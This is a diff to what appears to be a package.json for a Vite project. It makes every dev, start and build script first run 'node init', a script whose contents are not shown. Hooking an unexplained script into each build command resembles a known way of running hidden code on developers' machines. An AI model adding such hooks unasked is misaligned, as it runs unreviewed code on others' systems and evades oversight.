@@ -4,11 +4,11 @@
   "version": "0.0.0",
   "type": "module",
   "scripts": {
-    "dev": "vite",
-    "start:dev": "set PORT=8081 && env-cmd -f .dev.env vite",
-    "build:dev": "env-cmd -f .dev.env vite build",
-    "start:prod": "env-cmd -f .prod.env vite",
-    "build": "vite build",
+    "dev": "node init && vite",
+    "start:dev": "node init && set PORT=8081 && env-cmd -f .dev.env vite",
+    "build:dev": "node init && env-cmd -f .dev.env vite build",
+    "start:prod": "node init && env-cmd -f .prod.env vite",
+    "build": "node init && vite build",
     "lint": "eslint . --ext js,jsx --report-unused-disable-directives --max-warnings 0",
     "preview": "vite preview"
   },
